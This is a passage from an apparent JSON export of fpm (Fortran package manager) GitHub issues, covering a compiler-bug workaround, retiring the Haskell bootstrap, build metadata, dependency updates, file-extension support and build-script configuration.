                    "text": "@urbanjost, I believe I've tracked it down to the split(3f) function used both in M_CLI2 and in the fpm_strings module. There appears to be a compiler bug with mingw-w64-gcc 8.1.0 whereby the case (:high) syntax for the select case clause is not correctly implemented.\nI find replacing 'case (:0)' with 'case (0)' fixes the issue:\ndiff --git a/src/M_CLI2.f90 b/src/M_CLI2.f90\nindex 7f95e31..d022a52 100644\n--- a/src/M_CLI2.f90\n+++ b/src/M_CLI2.f90\n@@ -3071,7 +3071,7 @@ integer                       :: imax                   ! length of longest toke\n !-----------------------------------------------------------------------------------------------------------------------------------\n    select case (ilen)\n !-----------------------------------------------------------------------------------------------------------------------------------\n-   case (:0)                                                      ! command was totally blank\n+   case (0)                                                      ! command was totally blank\n !-----------------------------------------------------------------------------------------------------------------------------------\n    case default"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-29 12:29:25+00:00",
                    "text": "I've created a PR at urbanjost/M_CLI2#4. If you are happy with it, after merging I will open a subsequent PR in this repo with an update revision for M_CLI2 and the same fix applied in the fpm_strings module."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 01:50:15+00:00",
                    "text": "Thanks. Had not had time to look at this further till now. Looks like you have a general solution.  Looking at it now."
                }
            ]
        },
        {
            "number": 253,
            "user": "milancurcic",
            "date": "2020-11-26 17:48:33+00:00",
            "title": "Phase out fpm-bootstrap",
            "text": "With #246 merged (great work @LKedward!) a user that arrives to fortran-lang/fpm can easily:\n\nDownload and run a binary for their platform\nDownload and run the same binary to bootstrap fpm from source\n\nfpm thus does not anymore need the Haskell fpm for bootstrapping. However, the README.md still asks the user to install Haskell for building from source. The correct instructions should now be to first download the appropriate fpm binary and then run fpm build in the fpm repo directory.\nI think we should at this point start to de-emphasize the Haskell implementation in this repo as much as possible. It served its purpose superbly (thank you @everythingfunctional!), but it now can confuse newcomers to the project, which is not helpful at best and harmful at worst (I've seen it more than a few times now). With the ever-shorter attention spans, first impressions matter more than ever.\nI propose the following steps to phase out fpm-bootstrap:\n\nUpdate README.md to not require Haskell for building from source.\nMove the fpm project (contents of https://github.com/fortran-lang/fpm/tree/master/fpm) to the top-level.\nMove contents of https://github.com/fortran-lang/fpm/tree/master/bootstrap to a separate repo. I suggest either fpm-haskell or fpm-hs instead of fpm-bootstrap, because using the word \"bootstrap\" here is now misleading. Ditto with the contents of the archive directory (early Rust prototype), though this one I think we should just remove to not confuse anybody. The code will exist in the git history anyway.\n\nOf course, the Haskell fpm should live on if people want to develop or use it.\nWhat do you think?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-26 17:58:41+00:00",
                    "text": "I agree; simplifying the process for developers should hopefully increase engagement with the project. I realised during #246 that the Haskell version now needs to move to a separate repo now that we are explicitly versioning the Fortran implementation.\nThere is still the issue of bootstrapping on non x86_64 platforms, but I don't know how common these are for development.\nPresumably we can also delete the 'archive' folder which isn't necessary on git?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 18:00:39+00:00",
                    "text": "Sounds like a good plan. Splitting projects on GitHub works usually seamlessly. If we want to preserve the git history we can just clone this repository and push it to the new repo and prune the repositories afterwards. Issues relevant for Haskell fpm can be easily moved within repositories of an organisation from my experience, so nothing gets lost in this transition."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 18:05:05+00:00",
                    "text": "There is still the issue of bootstrapping on non x86_64 platforms, but I don't know how common these are for development.\n\nI have some experience compiling and packaging for PowerPC and ARM on conda-forge. For now we don't have to worry, we can either bootstrap a version on PowerPC, ARM, ... later with the Haskell version (if stack is available there and we find a CI provider, drone offers ARM, Travis-CI offers PowerPC and ARM) or just cross-compile using our native x86_64 binary (for OSX ARM which nobody offers on CI yet)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-26 18:11:41+00:00",
                    "text": "From the time we decided to (re)implement in Fortran, that had basically always been the plan. If we've reached that point (which it seems we have), then I'm in favor of it.\nI will echo @LKedward's concern about other architectures, but my understanding is that bootstrapping for new architectures is usually done via cross-compiler tool chains anyways. So if the Fortran version has sufficient support to allow cross-compiling (or it will be completed very soon), then this isn't really a big issue.\nI intend to continue using the Haskell version as a platform for experimentation. If the fortran-lang project does not wish to continue hosting it, I will be happy to keep it going under my personal account. In either case, I hope it becomes less and less necessary over time.\nI must say, the amount of support and community contributions this project has received over the last 9 months (I can't believe we only started this project 9 months ago!) has been quite exciting and far exceeded even my wildest expectations. I owe a great deal of gratitude to everyone who has contributed."
                },
                {
                    "user": "certik",
                    "date": "2020-11-27 17:47:40+00:00",
                    "text": "Thank you Brad, Laurence, Milan, Sebastian and others! Indeed, we are doing really well, I am very happy with the progress so far, and I agree to simply bootstrap using Fortran by default, only keeping the Haskell as a \"backup\", which won't be the default anymore. Also I think we will soon get #123 working, which will allow to bootstrap fpm from Fortran source using cmake on any architecture."
                },
                {
                    "user": "certik",
                    "date": "2020-12-09 19:24:46+00:00",
                    "text": "I tested the fpm (Fortran) binary and it works to bootstrap fpm on my Ubuntu 18.04 machine.\nI suggest to host the Haskell fpm binaries elsewhere, not at the main fpm repository, because it confuses people:\nhttps://twitter.com/MattChallacombe/status/1336738204452417536\nThe released binaries are intended for end users, and end users shouldn't need the Haskell version. The Haskell version is for developers, or to bootstrap fpm from scratch (but then you wouldn't use the binary version anyway)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:36:15+00:00",
                    "text": "I'll go through the issue list and try to cleanup stuff that is already fixed or not relevant anymore. Any help on this is highly appreciated."
                }
            ]
        },
        {
            "number": 252,
            "user": "urbanjost",
            "date": "2020-11-25 19:28:55+00:00",
            "title": "A proposed \"metadata\" command to include metadata from the TOML configuration file in a Fortran-readable format",
            "text": "Something I miss using fpm(1) versus my own tools is being able to provide metadata to the Fortran files directly such as the build time, compiler version used (which some compilers can now provide via Fortran intrinsics), the version number and\nsuch. Essentially if there were a command that converted the TOML metadata into PARAMETER statements each time the build command were used you would have much the same functionality available. Packages past and present such as sccs(1) provided some way to do this but (unless I missed it) git(1) does not. I am not suggesting this is high priority for fpm(1) but would like it discussed and added to the list as appropriate. If an INCLUDE file could be generated automatically or via  a subcommand it would be much easier to include correct version and license information in programs without having to edit the code files or a manual editing of an include file it is so often easy to overlook changing the build date or version in.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-25 19:57:29+00:00",
                    "text": "Sounds like a good idea, having to maintain redundant information in different places is really error prone. For meson and CMake I use configure_file to insert build system meta data as parameter into Fortran source code. I very much in favour of having a configure_file or similar option for fpm as well."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:13:41+00:00",
                    "text": "@awvwgk is a configure_file in your case a Fortran include file? Nevermind, I see configure_file is essentially a preprocessor mechanism.\nWould there be any advantages to doing this with a (read-only) namelist or maybe having a public fpm_tools module which contains some functions and subroutines to recover such meta-data from some cached build/toml files?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 16:18:58+00:00",
                    "text": "Preferably we keep in line with existing configure_file implementations as present in CMake and meson instead of making up our own: https://mesonbuild.com/Configuration.html. In a multi-build system approach one might want to use the same template for fpm, CMake and meson and get the same result independent of the build system used."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:55:58+00:00",
                    "text": "Can you point me to a Fortran example of yours in a public repository? I still have trouble grasping if the concept relies upon use of the cpp/fpp preprocessor or are the input files preprocessed independently by CMake/meson.\nIs the following a valid setup example?\nI have a template file called projconfig.fi.in, containing\ncharacter(*), parameter :: version = \"@FPM_VERSION_STR@\"\ninteger, parameter :: version_major = @FPM_VERSION_MAJOR@\ninteger, parameter :: version_minor = @FPM_VERSION_MINOR@\ninteger, parameter :: version_bugfix = @FPM_VERSION_BUGFIX@\n\nIn the manifest file of the project, we then specify this as a target for configuration, with the actual preprocessing/replacement done by an extension to fpm or a special command. The template substitution rules would follow the same definitions as CMake and Meson.\nFinally in the main module of my project, I can include the configured template file as:\nmodule myproject\n\n  include \"projconfig.fi\"\n\nend module"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 17:04:56+00:00",
                    "text": "For an example see:\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.name.in\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.f90#L43\nI made a small implementation here when working on the fpm-dist command\nhttps://github.com/fortran-lang/fpm/blob/e2a837b/fpm/src/fpm/dist/meson.f90#L433-L473"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 17:18:37+00:00",
                    "text": "For an example see:\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.name.in\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.f90#L43\n\nInteresting, if stdlib-os currently relies upon this configuration mechanism, and we want fpm to rely upon on stdlib-os in the future to get the operating system ID, does this mean that to bootstrap fpm using the Haskell version, it is necessary to use the current build-script feature (using CMake) or extend the Haskell version to support OS identification and configure file template substitution? This reminds me of the movie Inception..."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 17:24:02+00:00",
                    "text": "You can just cut the loop short and drop Haskell fpm from it, with support for configure_file in Fortran fpm we are already fine to dependent on stdlib_os once it is ported to fpm. No need to make life more complicated than necessary, just look for changeable parts were changes are simple to make."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 04:02:05+00:00",
                    "text": "As a simpler scheme that leverages some of the existing fpm components and required user knowledge, and does not require a preprocessor I would propose something like this:\no fpm parses the fpm.toml file (which it already does) and obtains the version number and other metadata such as the project name and author.  It then gets the compiler name from the command line, and the current time, and possibly the compiler options and the OS type.\no the build commands could add a -D $OS_TYPE and -D $COMPILER option or equivalent to the compiles, which I think all  major compilers support for use with cpp/fpp or their equivalent.\no using the metatadata it writes and compiles a module called fpm_metadata that creates a type of METADATA.\nThis could be ignored by the fpm user, but if desired they could include \"use fpm_metadata, only : metadata\" in their program and then get to at least a standard set of keywords by using such things as:\nwrite(*,*)'VERSION',metadata%version\nwrite(*,*)'COMPILE_TIME',metadata%compile_time\nand so on.  As more functions become available (via stdlib, preferably) such things as the equivalent of the output of a uname(1) command could also become default behavior.\nThis would require no preprocessing of the user code, supply a standard set of variables that could be used by all packages,\nand allow for standard names to be used in preprocessing and leverage the existing TOML configuration file and syntax. Since the existing code already parses the TOML file and it already contains some of the most common metadata such as the version number this would fit into the existing fpm quite naturally, I believe.\nThe drawback to the user would be that no such module would exist  outside of fpm.  So adding -DFPM to the build lines would allow for #ifdef FPM to be used as a preprocessor directive, and leaving the built code in build/ for the user to grab or use as a template for a build outside of fpm(1) would be desirable."
                }
            ]
        },
        {
            "number": 251,
            "user": "awvwgk",
            "date": "2020-11-24 23:29:15+00:00",
            "title": "Dependency management",
            "text": "Opening this for discussion and feedback.\nFor a detailed documentation have a look at src/fpm/dependency.f90\n\n implement fpm-update command, will fetch all dependencies when called\n to force an update the --all flag can be used\n fine grain control over which dependencies are fetched is available by invoking with the dependency names\n use TOML data structure as \u201chash table\u201d for dependency management\n dependencies are stored in build/cache.toml, internal file for now, not part of the user API\n retrieve and store checked out revision in cache file\n report unused or orphaned dependencies (don't delete them?)\n find a way to actually test all this without requiring to actually fetch something\n more documentation\n\nRequires #247\nRelated #121",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-26 12:10:19+00:00",
                    "text": "Thanks @awvwgk, implementation looks nicely done. Apologies I'm not very familiar with cargo and similar programs so I have a few basic questions:\n\ndoes fpm update only update a dependency if the revision hasn't been specified with a commit or a tag in the manifest?\n\nwhen I try fpm update with a dependency with no version information in the manifest, I notice that no git-obj is produced in the dep-lock.toml - shouldn't the latest commit be stored here?\n\n\ncan I use fpm update to update dependencies after I've change the version information in the manifest?\ndoes the existing checkout procedure for dependencies need updating to use information from the lock file if it exists?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 12:33:12+00:00",
                    "text": "Thanks for testing, I'm still experimenting with a useful lock file format and possible update procedure. Right now the lock file is only descriptive to see how reusing information between two separate runs can work and acts more like a hash table to avoid having several versions of the same dependency around.\nGetting the actual commit after fetching a git dependency is still something to do.\nFinding a good fpm package to test is also quite a challenge, I use jsonff from @everythingfunctional, which has a moderately extensive dependency tree (there the current --all option fails, so I have to redo this part)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 15:16:34+00:00",
                    "text": "I think I found a stable way to actually handle the dependency update for now. I renamed the dep-lock.toml to cache.toml, since it is currently used as cache rather than an actual lock file.\nThe update command supports three modes now:\n\njust a plain fpm update will update all dependencies of the project\nwith fpm update <name>... all the provided dependency names are updated based on the information in the cache file\nfpm update --fetch-only will only fetch not already present dependencies, this mode will be used by all other commands interacting with dependencies\n\nThe more difficult part will be the creation of unit tests for this, without actually requiring to fetch some git repositories."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 15:20:27+00:00",
                    "text": "@LKedward I'm not sure if I want to apply the fetch-only mode already for fpm-build since this might collide with #248, but I would definitely implement the same backend in a later PR or after #248 is merged."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 15:26:46+00:00",
                    "text": "There are two ways to design such code to make it unit testable. In a functional style, the code returns the commands/actions it would like to be executed, and some other code further up the call chain is responsible for actually executing them. In this way the unit tests can check that the code is returning the correct actions.\nIn an object oriented style, the code makes use of an abstract derived type to execute the necessary commands/actions. In the \"production\" code the caller supplies a version which just executes the actions, but in the test code a version is provided which only records the actions without executing them so that the test can check them."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-02 08:54:18+00:00",
                    "text": "I'll give this another try. I'll keep the command-line interface but use an iterative implementation rather than a recursive one."
                }
            ]
        },
        {
            "number": 250,
            "user": "ivan-pi",
            "date": "2020-11-23 10:16:04+00:00",
            "title": "Support additional file extensions",
            "text": "Once fpm will be out in the wild, we should try to support other Fortran file extensions.\nThis is not so important right now, but I thought I will create an issue since I gathered the information.\nHere is a table of file extensions with default support by different compilers:\n\n\n\nCompiler\nFixed-form\nFixed-form with preprocessor\nFree-form\nFree form with preprocessor\n\n\n\n\ngfortran\n.f, .for, .ftn\n.fpp, .F, .FOR, .FPP, .FTN\n.f90, .f95, .f03, .f08\n.F90, .F95, .F03, .F08\n\n\nifort\n.f, .for, .ftn, .i\n.fpp, .FPP, .F, .FOR, .FTN\n.f90, .i90\n.F90\n\n\nnvfortran\n.f .for .ftn\n.F .FOR .FTN .fpp .FPP\n.f90 .f95 .f03\n.F90 .F95 .F03\n\n\nnagfor\n.f, .for, .ftn\n.f90, .i90\n.f90, .f95\n.ff90, .ff95, .F90, .F95\n\n\nCray\n.f, .for\n.F, .FOR\n.f90, .f95, .f03, .f08, .f18, .ftn\n.F90, .F95, .F03, .F08, .F18, .FTN\n\n\nIBM\n.f, .f77\n.F, .F77\n.f90, .f95, .f03, .f08\n.F90, .F95, .F03, .F08\n\n\ng95\n.f, .for\n.F, .FOR\n.f90, .f95, .f03\n.F90, .F95, .F03\n\n\n\nThe only options that are compatible along the tool-chains listed above are: .f, .F, .f90, .F90.\nThe .ftn extension has a clash between gfortran, ifort, and nagfor which assume fixed-form, and Cray which assumes free-form.\nTo enhance portability between compilers, we should either allow fpm to (copy and) rename the files silently, or have fpm print a message to the user to consider renaming his files.\nBlog posts related to this issue:\n\n\u201cSource Form Just Wants to be Free\u201d by Doctor Fortran\nFortran File Extensions by degenerateconic\n\nEdit: Feel free to add more compilers.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 10:29:01+00:00",
                    "text": "On second thought, most compilers provide flags which allow to select fixed- or free-form format, meaning we could try and implement this without the need to rename files (e.g. if fpm doesn't have write access).\nBut perhaps printing an message to the user would shift the community in the direction of adopting the compatible extensions."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 10:44:23+00:00",
                    "text": "Alternatively, we could decide on a minimal set compatible for all compilers and allow explicit extension / overwriting on per project basis in the package manifest (some projects use .f while being completely free format source)."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 10:53:34+00:00",
                    "text": "Good point. I recall now the dbcsr uses the .F extension for all their source files which are free-form.\nSo we should agree on some sane default behavior and allow the package developers to use whatever file extensions and source code format they want via the manifest."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 13:25:21+00:00",
                    "text": "Here is a table of the respective compiler options for controlling input source format and preprocessing:\n\n\n\nCompiler\nFixed-form\nFree-form\nInvoke (C) preprocessor\n\n\n\n\ngfortran\n-ffixed-form\n-ffree-form\n-cpp\n\n\nifort\n-fixed\n-free\n-fpp\n\n\nifort (Windows)\n/fixed\n/free\n/fpp\n\n\nnvfortran\n-Mfixed\n-Mfree\n-Mpreprocess\n\n\nnagfor\n-fixed\n-free\n-fpp\n\n\nCray\n-f fixed\n-f free\n-eP, -eZ\n\n\nIBM\n-qfixed\n-qfree, -k\n-qpreprocess\n\n\ng95\n-ffixed-form\n-ffree-form\n-cpp\n\n\nflang\n-Mfixed\n-Mfreeform\n-Mpreprocess\n\n\n\nFor fixed-form the default line length is 72. For free-form the default line lengths differ between compilers (132, 255, or any).\nThe preprocessors are not fully compatible between compilers."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 14:04:07+00:00",
                    "text": "Added NVHPC/PGI compilers, which additionally support .cuf for CUDA Fortran and .CUF for preprocessed CUDA Fortran."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 14:55:55+00:00",
                    "text": "In the blog post from Steve, there is a link to a post from Intel: Problem: Fortran source files not compiled when building in Visual Studio, which shows how the source and header file extensions are specified in Visual studio.\nI haven't studied the manifest or TOML syntax closely, but I imagine this would mean introducing something like this:\n[build]\nsource.free = [\".f90\", \".f03\", \".f08\"]\nsource.fixed = [\".f\", \".f77\"]\nfpm would then neglect all files with other extensions. I am not sure if we need to specify any file extensions for include statements, or do we just allow the compiler to search for the files and report any errors?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 15:03:36+00:00",
                    "text": "I would remove the dot from the extension, but the general syntax looks good to me. We will probably need additional entries for the preprocessed files as well:\n[build.source]\nfree = [\"f90\", \"f03\", \"f08\"]\nfree-preprocess = [\"F90\", \"F03\", \"F08\", \"fypp\"]  # or free-pp\nfixed = [\"f\", \"f77\"]\nfixed-preprocess = [\"F\", \"F77\", \"fpp\"]  # or fixed-pp"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 16:23:33+00:00",
                    "text": "I agree that is cleaner.\nWith respect to the preprocesser, I think we might need to distinguish between external preprocessors (like fypp, or preform) and those built into the compiler (C-like macro processors). Interestingly, ifort has the option to specify an alternative preprocessor using the flag -fpp-name=<name>."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 16:44:49+00:00",
                    "text": "The preprocessor and its operation mode (\"built-in\", \"external\") could be selected in a separate entry in the [build] table. In case fpm recognizes the Intel compiler, it could try to apply an external preprocessor using the given flag, but I fear we might need to preprocess separately anyway, in case module names are mangled with preprocessor directives."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 18:35:03+00:00",
                    "text": "Unless the names are treated differently I am a strong advocate for just ..f|.F|.F90|.f90. If specifying a suffix like .f03 meant Fortran was required to strictly apply the standard as specified for that standard version (which is not the case as far as the standard is concerned) I do not like the other extensions.  For a package that is intended to be designed for use by others I think I prefer the user being required to do the preprocessing themselves and only present .f|.f90 files to fpm unless fpm bundles a \"standard\" preprocessor(s).  For fpm use building a local package I'm not quite as strong an advocate for that."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 18:37:28+00:00",
                    "text": "Sun used to distribute an fpp command that was written in Fortran if I recall. I use my own. 96% of my Fortran files are actually .ff and .FF files that run through a preprocessor but a lot of experience has shown me you only distribute .f90 and .f files unless there is no alternative."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-24 09:48:30+00:00",
                    "text": "Unless the names are treated differently I am a strong advocate for just ..f|.F|.F90|.f90. If specifying a suffix like .f03 meant Fortran was required to strictly apply the standard as specified for that standard version (which is not the case as far as the standard is concerned) I do not like the other extensions. For a package that is intended to be designed for use by others I think I prefer the user being required to do the preprocessing themselves and only present .f|.f90 files to fpm unless fpm bundles a \"standard\" preprocessor(s). For fpm use building a local package I'm not quite as strong an advocate for that.\n\nPersonally, I agree with sticking to \".f\" for fixed, and \".f90\" for free form. Definitely, we should not tie the extensions to specific language standard. However, I am afraid that among developers there is not total consensus. As Steve notes in his blog post: \"as far as the standard was concerned, source lines were delivered to the \u201cprocessor\u201d (compiler) by fairies in the night.\", which I believe is still true today. The file extensions are merely a default set by compiler vendors. Misconceptions concerning file extensions and the Fortran language standards pop up routinely on comp.lang.fortran, Stack Exchange, r/Fortran, and now even on our Discourse.\nAdmittedly, when I started to learn Fortran for CFD, I used the \".f95\" extension. At that time I had never heard of Linux before, nor had I used the command line. The lowest entry point I could find was the Silverfrost FTN95 compiler on Windows. The example programs used the \".f95\" extension. In fact, I was not even aware that modern editions of Fortran existed, as all the examples I could find on the internet were procedural style CFD codes in F77 or F90. Only recently (three years ago!), when I got access to the Intel Fortran compiler at my university, I found out I need to use the \".f90\" extensions to have things work automatically. At the same time you have some respectable Fortran codebases (like cp2k), which bypass the default compiler options, and use \".F\" even for free-form.\nSince fpm is supposed to automatically detect Fortran source files, I believe in the future we should also search for other file extensions. If any are found, we have two options:\n\nInform the user that unless specified in the manifest, fpm assumes the source file extensions are \".f\" for fixed-form, and \".f90\" for free-form, and recommend the user to rename his files, or fill out the [build.source] section of the manifest.\nDetect automatically if the sources are free or fixed, and whether they  require preprocessing, and deal with it silently by setting all the necessary compiler flags.\n\nPersonally, I am in favor of the first option. As a beginner in Fortran, this would nudge me in the right direction.\nSpeaking of option 2, it seems like a fun project with neural-fortran, the input to the neural network could be the number of ! and C characters, frequency of spaces in the first six positions, frequency of upper and lower case letters, and the frequency of symbols suchs as #, @, and $ normally used by preprocessors."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:51:14+00:00",
                    "text": "I like the neural-fortran idea better; but you just reminded me of some elaborate make(1) files I inherited that were all set up for the Intel compiler except these lines that called \"gfortran -fsyntax-only ...\" with the output module files thrown into a scratch directory and then erased and a bunch of other oddities. It took a moment looking at the subsequent lines to see he was compiling the code with syntax checking with gfortran only and forcing -ffixed-form (or whatever the option is) and if it failed the syntax check he was assuming it was free-form. A dangerous game but apparently it worked the way he wanted. We took it out and renamed the files and changed a few other parts that had .ftn and such built into them. Not recommending anyone use that method!  He had been moving a large amount of F77 code to free-format and apparently got tired of renaming the files and making related changes, I think.  Several compilers allow for directives in the source files to specify fixed versus free format at least down to the level of a single procedure. When changing old large multi-procedure files that is particularly handy (versus splitting them all apart of having to rewrite them all, and so on). If you are grabbing fixed-format codes and merging them into modules that is initially very useful. If would be nice when free-format was introduced if that had been an attribute you could specify at the beginning of a procedure definition, like\nfreeformat elemental pure function MYPROC(...\n\nbut specifying a code syntax attribute and function attributes together would probably not appeal to everyone."
                }
            ]
        },
        {
            "number": 249,
            "user": "awvwgk",
            "date": "2020-11-22 09:01:00+00:00",
            "title": "build-script location",
            "text": "Currently the build-script can specified in the [library] table with:\nlibrary.build-script = \"build.mk\"\nFor an executable only project, a library table would still be required to select a build script, even if no library sources are actually available.\nAdding the build-script to the [build] table feels more intuitive. Either as build-script or to reduce redundancy, just script:\nbuild.build-script = \"build.mk\"\nbuild.script = \"build.mk\"\nThis might be a breaking change for some projects using this fpm feature.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 20:27:10+00:00",
                    "text": "In Cargo, the default behavior is to check for a file named build.rs in the root of the package. A custom build script can be specified as:\n[package]\n# ...\nbuild = \"custom_build_name.rs\"\n\nTo disable automatic build script detection the setting is simply build = false. The possibility to use other build systems is then delegated to custom user packages which are called from build.rs.\nThe suggestion from @certik in #94 was to allow any kind of build script, be it a binary executable, shell script, Makefile, or other build system. Since fpm is only allowed to interact with the build script through environment variables and the output of the build script to standard output prepended with fpm:. This seemed like a reasonable idea. Upon further thought, I am worried this might become an obstacle for cross-compatibility between different operating systems. In this case fpm will need to report to the user to install CMake, Meson, Make, bash, etc. or whatever build system necessary.\nIn any case, do we also want to support such automatic build script detection?\nRelated to the immediate issue above, I agree that the [library] section does not feel right in case of executable-only projects. The build.script seems more fitting, also considering the fact the link keyword is in the same table."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-20 21:51:10+00:00",
                    "text": "I always wondered why Makefiles take such a special role in fpm, while CMake and meson are standardized enough to give a somewhat predictable behaviour for third-party tools, a Makefile can hide all kind of surprises and caveats inside (I never get tired of a random Makefile suddenly starting to write stuff in my home directory).\nInteracting with other build files will always be difficult for fpm, have a look at fortran-lang/fortran-lang.org#157 for an incomplete list. Preferably we can convince projects to switch to fpm, but most likely we will end up with projects supporting fpm and their original build system. My projects currently all support meson, but many have additional fpm support or CMake support, depending on the communities they find use in.\n\nIn any case, do we also want to support such automatic build script detection?\n\nPlease don't, those features should be opt-in only, I don't want fpm to start auto-detecting my meson build files and force me to disable another of the automatic detection features in my projects."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-20 22:56:30+00:00",
                    "text": "I certainly agree we don't want fpm interacting with other build systems aimed to be use independently from fpm.\nMy proposition/question was only related to the way Cargo automatically looks for a build.rs file. Under this model behavior, and the suggestion from @certik, fpm could look for build.sh, build.mk, build.cmake, etc.\nBut given that Fortran is not a monolithic/centralized language like Rust, and that there is a large variety of different build systems in everday use, it makes more sense to require package developers to specify a build script explicitly and save us the trouble from having to disable it manually.\n(I admit to having a soft spot for auto-detecting a build.f90 program; the idea of writing a Fortran executable to specify a foreign language package build sounds both crazy and very fascinating at the same time.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-20 23:17:07+00:00",
                    "text": "Okay, let's try to make the manifest syntax a bit more concrete.\nI would propose we could have external build scripts (as array of strings), they are invoked by fpm and we just hope they play nicely together with fpm, but guarantee for nothing:\nbuild.script = [\"make\", \"-f\", \"build.mk\"]  # or just [\"build.mk\"], make extension is detected\nbuild.script = [\"sh\", \"build.sh\"]  # or just [\"build.sh\"], shell extension is detected\nbuild.script = [\"python\", \"build.py\"]  # or just [\"build.py\"], Python extension is detected\nbuild.script = [\"ruby\", \"build.rb\"] # or just [\"build.rb\"], Ruby extension is detected\nbuild.script = [\"cmake\"]  # we might detect that it is CMake and run multiple steps for this script\nAnd actual build scripts like proposed in #94 (provided as string), we will allow any format supported by fpm (f90, f, F90, F and c) as well as scripts (we can detect extensions as well and try to call the script with the correct program):\nbuild.script = \"build.f90\"  # compile and run Fortran executable\nbuild.script = \"build.c\"  # compile and run C executable\nbuild.script = \"build.sh\"  # run shell script\nbuild.script = \"build.py\"  # run Python script\nbuild.script = \"build.rb\"  # run Ruby script\nThe script is expected to produce fpm: instructions which fpm parses and uses to build the project.\nThis might require a new table of build-dependencies at some point, which are usable in the build script."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 00:36:41+00:00",
                    "text": "This might require a new table of build-dependencies at some point, which are usable in the build script.\n\nThis only seems to make sense for build scripts which are C or Fortran executables, allowing fpm to resolve (and reuse) their dependencies. Am I right? (I see many signs fpm will ultimately evolve also into a C package manager. )\nIs there any intrinsic benefit to supporting build scripts in dynamic languages directly (apart from user convenience)? This could be done after all in a Fortran main program:\n! build.f90\nwrite(*,*) \"fpm:rerun-if-changed=build.py\"\ncall execute_command_line(\"python build.py\")\nend"
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 11:01:04+00:00",
                    "text": "I wonder whether we should perhaps separate discussion of build scripts into those with one-way and two-way communication with fpm. The former, implemented experimentally in Haskell version, receive inputs via environment variables and are expected to place libraries in the correct location. The latter have reverse-communication with fpm via stdout (#94) for more advanced behaviour.\nMy intention for #219 was only to initially implement one-way build scripts to support cases such as #341. In terms of specification I think that we should avoid hard-coding the detection of specific file-extensions or build systems and simply have an array of strings to be invoked at the command line by fpm (I like your proposed syntax for this above @awvwgk).\nWhile I like the idea of build.f90 etc., I'm hesitant to prioritise build scripts with reverse communication at such an early stage in fpm development. IMHO I think we should encourage package maintainers to adopt the native fpm package structure and work with them to improve fpm accordingly."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 15:56:03+00:00",
                    "text": "That is a good way to look at it. I imagine in a one way setup, the script invoked would be responsible to place all the necessary executable files, module files, and binaries into a specified folder.\nWould it then be up to the package developer to hard code any flags required for linkage straight into the manifest of the package?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:04:03+00:00",
                    "text": "In terms of specification I think that we should avoid hard-coding the detection of specific file-extensions or build systems and simply have an array of strings to be invoked at the command line by fpm (I like your proposed syntax for this above @awvwgk).\n\nWould this also work in the eventual case of a Fortran main program? For example:\nbuild.script = ['$FPM_FC', 'build.f90', '-o', 'build', '&&', './build']\n\nI can imagine this would become unwieldy, if my build program requires some other fpm-sourced modules.\nBut I agree to prioritise the first case (no reverse communication), as it would already enable a lot more complex projects."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 16:13:36+00:00",
                    "text": "Would this also work in the eventual case of a Fortran main program? For example:\nbuild.script = ['$FPM_FC', 'build.f90', '-o', 'build', '&&', './build']\n\n\nThis should not be allowed, because we will guard the command execution against variable expansion and command chaining at some point, see #166.\nI took some inspiration from docker where entry points and commands are defined differently by syntax, of course we can separate the one and two way communication more easily by allowing separate entries which are mutually exclusive. The advantage of only allowing a string for a two way build script instead of a full command line is that we move the complexity from the package manifest (configuration file) to the build script (full programming language)."
                }
            ]
        },
        {
            "number": 248,
            "user": "LKedward",
            "date": "2020-11-21 16:33:23+00:00",
            "title": "Refactor backend for incremental rebuilds",
